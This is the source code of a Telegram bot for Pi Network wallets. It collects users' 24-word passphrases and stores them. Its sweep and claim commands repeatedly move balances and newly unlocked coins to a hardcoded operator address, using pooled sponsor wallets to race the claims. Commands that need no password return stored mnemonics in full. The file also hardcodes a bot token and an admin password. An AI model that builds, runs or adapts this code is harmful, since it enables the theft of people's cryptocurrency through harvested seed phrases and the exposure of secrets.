import TelegramBot from "node-telegram-bot-api";
import { FloodchannelTransaction, getAccount, getBalance, getClaimableBalance, getKeypairFromPassphrase, sleep, sweepWallet } from "./utils/fn.js";
import { storeLockedPi, storeSponsor, upsertSettings } from "./utils/modelfn.js";
import { connectToDB } from "./db.js";
import Sponsors from "./models/Sponsors.js";
import Passphrase from "./models/Passphrase.js";
import { formatReadableTimeString, splitMessage, timeAgoOrInString } from "./utils/helper.js";
import Settings from "./models/Settings.js";

const token = '7940844852:AAEY5NwW8ORu6X45xuWEp4Klq_3sO17OH7o';
const MAIN_ADDRESS = 'GDOQD7EVNKEB775WCG7DZ3L6H7RTPLXKAGM46JEARLGROQM6TOX3D2BS';
const PASSWORD = '8144700718';



const bot = new TelegramBot(token, { polling: true });
await connectToDB();
let userSessions = {};

bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "Welcome! Type /help to see commands, by @fritzdecode");
})
bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;

    if (!userSessions[chatId]) {
        userSessions[chatId] = {};
    }
    userSessions[chatId]['stopAll'] = true;
    return bot.sendMessage(chatId, 'Stopping any running process');
});

bot.onText(/\/settings/, (msg) => {
    const helpText = `
        📘 Settings Commands:
        /funder - Update wallet to fund sponsors
        /myAddress - Update your receiving address
        /maxFlood - Update max bot request flood count
        `;
    return bot.sendMessage(msg.chat.id, helpText, { parse_mode: 'Markdown' });
});

bot.onText(/\/help/, (msg) => {
    const helpText = `
        📘 Bot Commands:
        /balance - Show Pi balance
        /claim - Claim unlocked Pi
        /search - Check if a wallet exists
        /searchP - Check if wallet exists and show the mnemonic
        /searchSponsor - Check if sponsor exists
        /listSponsors - List all sponsors
        /deleteSponsor - Delete a Sponosor
        /sweep - sweeps all available pi
        /uploadWallet - Upload a locked pi wallet with your valid wallet address
        /listPhrases - List all locked wallets
        /deleteWallet - Delete wallet from queue
        /stop - stops all running process
        /settings - Set vital info for your bot
        /showSettings - Show active settings
        `;
    return bot.sendMessage(msg.chat.id, helpText, { parse_mode: 'Markdown' });
});

bot.onText(/\/funder/, (msg) => {
    const chatId = msg.chat.id;
    userSessions[chatId] = { Funder: true }
    return bot.sendMessage(chatId, 'Please send your 24-word passphrase (seperated by space)', { parse_mode: 'Markdown' });
});

bot.onText(/\/myAddress/, (msg) => {
    const chatId = msg.chat.id;
    userSessions[chatId] = { MyAddress: true }
    return bot.sendMessage(chatId, 'Please send the wallet pulic key starting with *G* followed by password', { parse_mode: 'Markdown' });
});

bot.onText(/\/maxFlood/, (msg) => {
    const chatId = msg.chat.id;
    userSessions[chatId] = { MaxFlood: true }
    return bot.sendMessage(chatId, 'Please send a numeric value', { parse_mode: 'Markdown' });
});

bot.onText(/\/claim/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send your 24-word passphrase (seperated by space)', { parse_mode: 'Markdown' });
    userSessions[chatId] = { isClaiming: true }
});

bot.onText(/\/search/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send the wallet pulic key starting with *G*', { parse_mode: 'Markdown' });

    userSessions[chatId] = { SearchingForWallet: true }
});

bot.onText(/\/searchP/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send the wallet pulic key starting with *G*', { parse_mode: 'Markdown' });

    userSessions[chatId] = { SearchingForWalletP: true }
});

bot.onText(/\/searchSponsor/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send the wallet pulic key starting with *G*', { parse_mode: 'Markdown' });

    userSessions[chatId] = { SearchingForASponsor: true }
});

bot.onText(/\/balance/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send your 24-word passphrase (seperated by space) OR Pi Wallet address');

    userSessions[chatId] = { waitingForPassphraseForBalance: true }
});


bot.onText(/\/sweep/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Please send your 24-word passphrase (seperated by space) to start sweeping');

    userSessions[chatId] = { waitingForPassphraseForSweeping: true, stopAll: false }
});

bot.onText(/\/uploadWallet/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '📥 Please send your 24-word passphrase followed by the wallet address.\n\nFormat:\n`word1 word2 ... word24 G...`', { parse_mode: 'Markdown' });
    userSessions[chatId] = { waitingForPassphraseAndAddress: true };
});

bot.onText(/\/deleteWallet/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '📥 Please send your 24-word passphrase.\n\nFormat:\n`word1 word2 ... word24`', { parse_mode: 'Markdown' });
    userSessions[chatId] = { waitingForDeletePassphrase: true };
});

bot.onText(/\/deleteSponsor/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '📥 Please send your 24-word passphrase.\n\nFormat:\n`word1 word2 ... word24`', { parse_mode: 'Markdown' });
    userSessions[chatId] = { waitingForDeleteSponsor: true };
});


bot.onText(/\/listWallets/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '📥 Please enter your wallet address');
    userSessions[chatId] = { waitingForMyWalletAddress: true };
});

bot.onText(/\/showSettings/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '📥 Please enter password');
    userSessions[chatId] = { showSettings: true };
});

bot.onText(/\/listSponsors/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const sponsors = await Sponsors.find({ name: 'shepherd' });

    if (sponsors.length === 0) {
        return bot.sendMessage(chatId, '❌ No sponsors found.');
    }

    const estimatedSeconds = sponsors.length; // 1s per sponsor
    bot.sendMessage(chatId, `⏳ Fetching balances for *${sponsors.length} sponsors*. Estimated time: *~${estimatedSeconds} seconds*`, {
        parse_mode: 'Markdown',
    });

    let lastUpdateTime = Date.now();
    let completed = 0;
    const progressMessage = async () => {
        const now = Date.now();
        if (now - lastUpdateTime > 5000 || completed % 5 === 0) {
            lastUpdateTime = now;
            await bot.sendMessage(chatId, `🔄 Progress: *${completed} of ${sponsors.length}* sponsors fetched...`, {
                parse_mode: 'Markdown',
            });
        }
    };


    bot.sendMessage(chatId, `⏳ Please wait while we fetch your sponsors...`)

    const list = await Promise.all(
        sponsors.map((s, index) =>
            new Promise((resolve) => {
                setTimeout(async () => {
                    try {
                    const kp = getKeypairFromPassphrase(s.mnemonic);
                    const accountData = await getAccount(kp.publicKey());

                    const balanceString = getBalance(accountData);
                    const balance = Math.max(parseFloat(balanceString) - 0.98, 0);

                    const phraseShort = s.mnemonic?.length > 14
                        ? `${s.mnemonic.slice(0, 7)}....${s.mnemonic.slice(-7)}`
                        : 'Unknown';

                    resolve(`${index + 1}. ${phraseShort} - *${balance.toFixed(7)} PI*`);
                        completed++;
                        progressMessage();
                    } catch (e) {
                    console.log(e);
                    console.log(s.mnemonic)
                    resolve(`${index + 1}. ${s.username || s.name || 'Unknown'} - ⚠️ Failed to fetch balance`);
                    }
                    
                }, index * 1005); // Stagger by 1 second per sponsor
            })
        )
    );

    const message = list.join('\n');
    const chunks = splitMessage(message);
    let i = 0;
    for (const chunk of chunks) {
        const heading = i === 0 ? `📋 *List of Sponsors: Page ${i+1} of ${chunks.length}*` : `⏳ *Contd: Page ${i+1} of ${chunks.length}*`;
        await bot.sendMessage(chatId, `${heading}\n\n${chunk}`, {
            parse_mode: 'Markdown',
        });

        i++;
    }

  } catch (err) {
    console.error('Error fetching sponsors:', err);
    bot.sendMessage(chatId, '⚠️ Failed to fetch sponsors. Try again later.');
  }
});

bot.onText(/\/listPhrases/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const passphrases = await Passphrase.find({ name: 'shepherd' }).sort({ claimableAt: 1 });

    if (passphrases.length === 0) {
      return bot.sendMessage(chatId, '❌ No wallet found.');
    }

    console.log(`Listing your wallets...`);
    await bot.sendMessage(chatId, `⏳ Please wait while we fetch your wallets...`)

    const list = await Promise.all(passphrases.map(async (p, index) => {
        if(!p.mnemonic) {
            await Passphrase.findByIdAndDelete(p._id);
            return null;
        }
        const kp = getKeypairFromPassphrase(p.mnemonic);
        const phraseShort = `${p.mnemonic.slice(0, 7)}....${p.mnemonic.slice(-7)}`;
        const baseMsg = `${index + 1}. ${phraseShort || 'Unknown'} --_${p.status}_`;
        if(!p.claimableAt) {
            return baseMsg + `\n ✅ PubKey: ${kp.publicKey()}` + '\n\n';
        }
        return  `${baseMsg}\n Locked coin: *${p.amount} PI*, Time *${formatReadableTimeString(p.claimableAt)} (${timeAgoOrInString(p.claimableAt)})*\n ✅ PubKey: ${kp.publicKey()} \n\n`;
    }));
    const cleanList = list.filter(Boolean);

    const message = cleanList.join('\n');

    const chunks = splitMessage(message);
    console.log(chunks)
    for (const chunk of chunks) {
        await bot.sendMessage(chatId, `📋 *List of Wallets:*\n\n${chunk}`, {
            parse_mode: 'Markdown',
        });
    }
    

  } catch (err) {
    console.error('Error fetching wallets:', err);
    bot.sendMessage(chatId, '⚠️ Failed to fetch wallets. Try again later.');
  }
});


bot.onText(/\/uploadSponsor/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '📥 Please send your 24-word passphrase.\n\nFormat:\n`word1 word2 ... word24`', { parse_mode: 'Markdown' });
    userSessions[chatId] = { waitingForPassphraseAndName: true };
});


// Upload passphrase
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if (!userSessions[chatId]?.waitingForPassphraseAndAddress) return;

    if(userSessions[chatId]?.waitingForPassphraseAndAddress) {
        const parts = text.split(/\s+/);
        const address = parts[parts.length - 1];
        const passphraseWords = parts.slice(0, -1);

        if(passphraseWords.length !== 24 || !/^G[A-Z2-7]{55}$/.test(address)) {
            return bot.sendMessage(chatId, '❌ Invalid format. Make sure you send 24 words followed by a valid wallet address (starts with G...)');
        }

        const passphrase = passphraseWords.join(' ');
        bot.sendMessage(chatId, `⏳ Validating and processing...`);

        try {
            const kp = getKeypairFromPassphrase(passphrase);
            const publicKey = kp.publicKey();

            const accountData = await getAccount(publicKey);

            const getReceiverAddressData = await getAccount(address);

            if(!accountData) {
                return bot.sendMessage(chatId, `❌ Invalid PI Wallet`);
            }

            if(!getReceiverAddressData) {
                return bot.sendMessage(chatId, `❌ Invalid Wallet address`);
            }

            bot.sendMessage(chatId, `✅ Passphrase derived public key: ${publicKey}`);
            
            const saved = await storeLockedPi(passphrase, publicKey, address, false, 'shepherd')
            bot.sendMessage(chatId, `${saved.success ? '✅' : '❌' } ${ saved.message }`);

        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, '❌ Error processing the data. Ensure passphrase is correct.');
        }

        delete userSessions[chatId];
    }
});

// List my passphrase
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if (!userSessions[chatId]?.waitingForMyWalletAddress) return;

    if(userSessions[chatId]?.waitingForMyWalletAddress) {
        try {
            const passphrases = await Passphrase.find({ receiverAddress: text, name: 'shepherd' });

        if (passphrases.length === 0) {
            return bot.sendMessage(chatId, '❌ No wallet found.');
        }

        bot.sendMessage(chatId, `⏳ Please wait while we fetch your wallets...`)

        const list = await Promise.all(passphrases.map(async (p, index) => {
            if(!p.mnemonic) {
                await Passphrase.findByIdAndDelete(p._id);
                return null;
            }
            const phraseShort = `${p.mnemonic.slice(0, 7)}....${p.mnemonic.slice(-7)}`;

            return `${index + 1}. ${phraseShort || 'Unknown'} - Locked coin: *${p.amount} PI* --_${p.status}_`;
        }));
        const cleanList = list.filter(Boolean);

        const message = cleanList.join('\n');

    
        bot.sendMessage(chatId, `📋 *List of Wallets:*\n\n${message}`, {
            parse_mode: 'Markdown',
        });

        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, `❌ Error processing the data. Please try again.`);
        }

        delete userSessions[chatId];
    }
});

// Search for wallet
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if (!userSessions[chatId]?.SearchingForWallet) return;

    if(userSessions[chatId]?.SearchingForWallet) {
        try {
            const passphrases = await Passphrase.find();

        if (passphrases.length === 0) {
            return bot.sendMessage(chatId, '❌ No wallet found.');
        }

        const existing = passphrases.find(phrase => {
            const kp = getKeypairFromPassphrase(phrase.mnemonic);
            return kp.publicKey() === text && phrase.name === 'shepherd';
        });

        if(existing) {
            delete userSessions[chatId];
            const lockedPi = existing.amount ? `locked ${existing.amount} PI` : 'No locked PI'
            return bot.sendMessage(chatId, `✅ Matching wallet with *${lockedPi}* found.`, { parse_mode: 'Markdown' });
            
        }
        delete userSessions[chatId];
        return bot.sendMessage(chatId, `❌ No matching wallet found.`);

        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, `❌ Error processing the data. Please try again.`);
        }

        delete userSessions[chatId];
    }
});

// Search for wallet Mnemonic
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if (!userSessions[chatId]?.SearchingForWalletP) return;

    if(userSessions[chatId]?.SearchingForWalletP) {
        try {
            const passphrases = await Passphrase.find();

        if (passphrases.length === 0) {
            delete userSessions[chatId];
            return bot.sendMessage(chatId, '❌ No wallet found.');
        }

        const existing = passphrases.find(phrase => {
            const kp = getKeypairFromPassphrase(phrase.mnemonic);
            return kp.publicKey() === text && phrase.name === 'shepherd';
        });

        if(existing) {
            delete userSessions[chatId];
            return bot.sendMessage(chatId, `✅ Matching wallet mnemonic: *${existing.mnemonic}*`, { parse_mode: 'Markdown' });
            
        }
        delete userSessions[chatId];
        return bot.sendMessage(chatId, `❌ No matching wallet found.`);

        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, `❌ Error processing the data. Please try again.`);
        }

        delete userSessions[chatId];
    }
});

// Search for sponsor Mnemonic
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if (!userSessions[chatId]?.SearchingForASponsor) return;

    if(userSessions[chatId]?.SearchingForASponsor) {
        try {
            const passphrases = await Sponsors.find();

        if (passphrases.length === 0) {
            delete userSessions[chatId];
            return bot.sendMessage(chatId, '❌ No wallet found.');
        }

        const existing = passphrases.find(phrase => {
            const kp = getKeypairFromPassphrase(phrase.mnemonic);
            return kp.publicKey() === text && phrase.name === 'shepherd';
        });

        if(existing) {
            delete userSessions[chatId];
            return bot.sendMessage(chatId, `✅ Matching wallet mnemonic: *${existing.mnemonic}*`, { parse_mode: 'Markdown' });
            
        }
        delete userSessions[chatId];
        return bot.sendMessage(chatId, `❌ No matching wallet found.`);

        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, `❌ Error processing the data. Please try again.`);
        }

        delete userSessions[chatId];
    }
});

// Delete selected passphrase
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if (!userSessions[chatId]?.waitingForDeletePassphrase) return;

    if(userSessions[chatId]?.waitingForDeletePassphrase) {
        try {
            const kp = getKeypairFromPassphrase(text);
            const deleted = await Passphrase.findOneAndDelete({ mnemonic: text, name: 'shepherd' });

            bot.sendMessage(chatId, `✅ Public Key: ${kp.publicKey()}`)

        if (!deleted) {
            return bot.sendMessage(chatId, `❌ Passphrase not found...`)
        }
        delete userSessions[chatId];
        return bot.sendMessage(chatId, `✅ Passphrase deleted...`)


        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, `❌ Error processing the data. Please try again.`);
        }

        delete userSessions[chatId];
    }
});

// Delete selected sponsor
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if (!userSessions[chatId]?.waitingForDeleteSponsor) return;

    if(userSessions[chatId]?.waitingForDeleteSponsor) {
        try {
            const kp = getKeypairFromPassphrase(text);
            const deleted = await Sponsors.findOneAndDelete({ mnemonic: text, name: 'shepherd' });

            bot.sendMessage(chatId, `✅ Public Key: ${kp.publicKey()}`)

        if (!deleted) {
            delete userSessions[chatId];
            return bot.sendMessage(chatId, `❌ Sponsor not found...`)
        }
        delete userSessions[chatId];
        return bot.sendMessage(chatId, `✅ Sponsor deleted...`)


        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, `❌ Error processing the data. Please try again.`);
        }

        delete userSessions[chatId];
    }
});


bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if (!userSessions[chatId]?.waitingForPassphraseAndName) return;

    if(userSessions[chatId]?.waitingForPassphraseAndName) {
        const passphraseWords = text.split(/\s+/);

        if(passphraseWords.length !== 24) {
            return bot.sendMessage(chatId, '❌ Invalid format. Make sure you send 24 words followed by a name');
        }

        const passphrase = passphraseWords.join(' ');
        bot.sendMessage(chatId, `⏳ Validating and processing...`);

        try {
            const kp = getKeypairFromPassphrase(passphrase);
            const publicKey = kp.publicKey();

            const accountData = await getAccount(publicKey);

            if(!accountData) {
                return bot.sendMessage(chatId, `❌ Invalid PI Wallet`);
            }

            bot.sendMessage(chatId, `✅ Passphrase derived public key: ${publicKey}`);
            
            const saved = await storeSponsor(passphrase, 'shepherd')
            bot.sendMessage(chatId, `${saved.success ? '✅' : '❌' } ${ saved.message }`);

        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, `❌ Error processing the data. Ensure passphrase is correct.`);
            delete userSessions[chatId];
        }
        delete userSessions[chatId];
    }
});


bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    if (!userSessions[chatId]?.waitingForPassphraseForSweeping) return;

    if(userSessions[chatId]?.waitingForPassphraseForSweeping) {
        while(!userSessions[chatId]?.stopAll) {
            const passphrase = msg.text.trim().toLocaleLowerCase();
            const words = passphrase.split(/\s+/);
            if(words.length !== 24) {
                return bot.sendMessage(chatId, '❌ Invalid passphrase. Please send exactly 24 words');
            }

            bot.sendMessage(chatId, '⏳ Sweeping Balance...');

            try {
                const kp = getKeypairFromPassphrase(passphrase)
                bot.sendMessage(chatId, `✅ Sender: ${kp.publicKey()}`);
                bot.sendMessage(chatId, `✅ Receiver: ${MAIN_ADDRESS}`);

                const accountData = await getAccount(kp.publicKey());
                const balanceString = getBalance(accountData);
                const balance = parseFloat(balanceString) - 0.98;

                if(balance - 0.01 <= 0) {
                    bot.sendMessage(chatId, `❌ Insufficient Balance: ${balance.toFixed(7)} PI`);
                } else {
                    const result = await sweepWallet(passphrase, MAIN_ADDRESS);
                    if(result.data && result.data.hash) {
                        bot.sendMessage(chatId, `✅ ${result.amount} PI sweeped`);
                    } else {
                        bot.sendMessage(chatId, `❌ Sweeping failed`);
                    }
                }
            } catch(error) {
                bot.sendMessage(chatId, `❌ Something went wrong, please try again`);
            }

            await sleep(1000);
        }

        delete userSessions[chatId]
    }
})


bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    if (!userSessions[chatId]?.waitingForPassphraseForBalance) return;

    try {
        if(userSessions[chatId]?.waitingForPassphraseForBalance) {
            const passphrase = msg.text.trim().toLocaleLowerCase();
            const words = passphrase.split(/\s+/);

            if(words.length === 1) {
                bot.sendMessage(chatId, '⏳ Checking validity of the address');
                const accountData = await getAccount(passphrase.toUpperCase());
                if(!accountData.balances) {
                    return bot.sendMessage(chatId, '❌ Invalid wallet. Please send address starting with G....');
                } else {
                    const balanceString = getBalance(accountData);
                    const balance = parseFloat(balanceString) - 0.98;
                    return bot.sendMessage(chatId, `✅ Balance: ${balance.toFixed(7)} PI`);
                }
            }

            if(words.length !== 24) {
                return bot.sendMessage(chatId, '❌ Invalid passphrase. Please send exactly 24 words');
            }

            bot.sendMessage(chatId, '⏳ Checking Balance...');

            try {
                const kp = getKeypairFromPassphrase(passphrase)
                bot.sendMessage(chatId, `✅ Public key: ${kp.publicKey()}`);

                const accountData = await getAccount(kp.publicKey());
                const balanceString = getBalance(accountData);
                const balance = parseFloat(balanceString) - 0.98;
                bot.sendMessage(chatId, `✅ Balance: ${balance.toFixed(7)} PI`);
            } catch(error) {
                bot.sendMessage(chatId, `❌ Failed to fetch balance. Please try again`);
            }

            // delete userSessions[chatId]
        }
    } catch(err) {
        delete userSessions[chatId]
        return bot.sendMessage(chatId, `❌ Unknown error occured`);
    }
})

// Upload Funder
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if (!userSessions[chatId]?.Funder) return;

    if(userSessions[chatId]?.Funder) {
        const passphraseWords = text.split(/\s+/);

        if(passphraseWords.length !== 24) {
            return bot.sendMessage(chatId, '❌ Invalid format. Make sure you send 24 words');
        }

        const passphrase = passphraseWords.join(' ');
        bot.sendMessage(chatId, `⏳ Validating and processing...`);

        try {
            const kp = getKeypairFromPassphrase(passphrase);
            const publicKey = kp.publicKey();

            const accountData = await getAccount(publicKey);

            if(!accountData) {
                return bot.sendMessage(chatId, `❌ Invalid PI Wallet`);
            }

            bot.sendMessage(chatId, `✅ Passphrase derived public key: ${publicKey}`);
            
            await upsertSettings({ funderMnemonic: passphrase, name: 'shepherd' });
            bot.sendMessage(chatId, `✅ Funder passphrase updated`);

        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, '❌ Error processing the data. Ensure passphrase is correct.');
        }

        delete userSessions[chatId];
    }
});

// Upload Flood count
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if (!userSessions[chatId]?.MaxFlood) return;

    if(userSessions[chatId]?.MaxFlood) {
        const maxFlood = Number(text);
        if(isNaN(maxFlood)) {
            delete userSessions[chatId];
            return bot.sendMessage(chatId, '❌ Please send a numeric value.');
        }
        if(maxFlood < 1) {
            delete userSessions[chatId];
            return bot.sendMessage(chatId, '❌ invalid value.');
        }

        try {
            const saved = await upsertSettings({ maxFlood, name: 'shepherd' });
            bot.sendMessage(chatId, `✅ maxFlood updated to ${maxFlood}`);

        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, '❌ Error processing the data. Ensure passphrase is correct.');
        }

        delete userSessions[chatId];
    }
});

// Upload Main Address
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if (!userSessions[chatId]?.MyAddress) return;

    if(userSessions[chatId]?.MyAddress) {
        const parts = text.split(/\s+/);
        const address = parts[0];
        const password = parts[1];

        bot.sendMessage(chatId, `⏳ Validating and processing...`);

        try {

            if(password !== PASSWORD) {
                delete userSessions[chatId];
                return bot.sendMessage(chatId, '⛔ Access Denied. You are not authorized to perform this action.');
            }

            const accountData = await getAccount(address);

            if(!accountData) {
                delete userSessions[chatId];
                return bot.sendMessage(chatId, `❌ Invalid PI wallet address`);
            }
            
            const saved = await upsertSettings({ mainAddress: address, name: 'shepherd' });
            bot.sendMessage(chatId, `✅ Main receiver address saved`);

        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, '❌ Error processing the data. Ensure passphrase is correct.');
        }

        delete userSessions[chatId];
    }
});

// Show settings
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();
    if (!userSessions[chatId]?.showSettings) return;

    if(userSessions[chatId]?.showSettings) {
        if(text !== PASSWORD) {
            return bot.sendMessage(chatId, '⛔ Access Denied. You are not authorized to perform this action.');
        }
        try {
            const settings = await Settings.findOne();

            if (!settings) {
                return bot.sendMessage(chatId, '⚠️ No settings found. Use /settings to see available commands.');
            }

            const funder = settings.funderMnemonic;
            const maxFlood = settings.maxFlood;
            const mainAddress = settings.mainAddress;
            const updatedAt = new Date(settings.lastUpdatedAt).toLocaleString('en-GB', {
                day: '2-digit',
                month: 'short',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
            });

            const message = `
                *🔧 Current Settings:*

                • *Main Address:* \`${mainAddress}\`
                • *Funder Mnemonic:* \`${funder}\`
                • *Max Flood:* \`${maxFlood}\`
                • *Last Updated:* _${updatedAt}_
                            `.trim();

    
            bot.sendMessage(chatId, message, {
                parse_mode: 'Markdown',
            });

        } catch (error) {
            console.log(error)
            bot.sendMessage(chatId, `❌ Error processing the data. Please try again.`);
        }

        delete userSessions[chatId];
    }
});

// Is Claiming
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();
    if (!text) return;
    if (!userSessions[chatId]?.isClaiming) return;

    // userSessions[chatId] = { isClaiming: true };
    bot.sendMessage(chatId, `🔍 Checking your Pi wallet...`);

    try {
        const kp = getKeypairFromPassphrase(text);
        const accountData = await getAccount(kp.publicKey());

        if (!accountData) {
            delete userSessions[chatId];
            return bot.sendMessage(chatId, `❌ Invalid Pi wallet. Please check your passphrase.`);
        }

        const checkInterval = setInterval(async () => {
            try {
                if (!userSessions[chatId]?.isClaiming) {
                    clearInterval(checkInterval);
                }
                const claimable = await getClaimableBalance(kp.publicKey());
                const records = claimable?._embedded?.records || [];

                if (records.length === 0) {
                    bot.sendMessage(chatId, `⚠️ No claimable Pi found yet. Still checking every second...`);
                    return;
                }

                const claimableEntries = [];
                for (const record of records) {
                    const claimant = record.claimants.find(c => c.destination === kp.publicKey());
                    if (!claimant) continue;

                    let claimableAt = new Date();
                    const predicate = claimant.predicate;

                    if (predicate?.not?.abs_before) {
                        claimableAt = new Date(predicate.not.abs_before);
                        if (claimableAt > new Date()) continue;
                    }

                    claimableEntries.push({
                        mnemonic: text,
                        claimableAt,
                        balanceId: record.id,
                        amount: record.amount
                    });
                }

                if (claimableEntries.length === 0) {
                    bot.sendMessage(chatId, `⚠️ Claimable balances found, but not yet claimable (waiting time).`);
                    return;
                }

                const sponsors = await Sponsors.find({ name: 'shepherd' });
                if (!sponsors.length) {
                    clearInterval(checkInterval);
                    delete userSessions[chatId];
                    return bot.sendMessage(chatId, `❌ No sponsor accounts available for claiming.`);
                }

                const results = await Promise.all(claimableEntries.map(entry =>
                    FloodchannelTransaction(
                        text,
                        entry.balanceId,
                        MAIN_ADDRESS,
                        entry.amount,
                        sponsors
                    )
                ));

                const successTxs = results.filter((res) => res?.hash);
                const failedTxs = results.filter((res) => !res?.hash);

                let message = `✅ Claiming finished.\n\n`;
                message += `🟢 Successful: ${successTxs.length}\n`;
                message += `🔴 Failed: ${failedTxs.length}\n\n`;

                bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
                clearInterval(checkInterval);
                delete userSessions[chatId];

            } catch (err) {
                console.error(err);
                bot.sendMessage(chatId, `❌ An error occurred: ${err.message}`);
                clearInterval(checkInterval);
                delete userSessions[chatId];
            }

        }, 1000);
    } catch(error) {
        console.log(error);
        bot.sendMessage(chatId, `❌ Error processing. Make sure your passphrase is correct.`);
        delete userSessions[chatId];
    }
});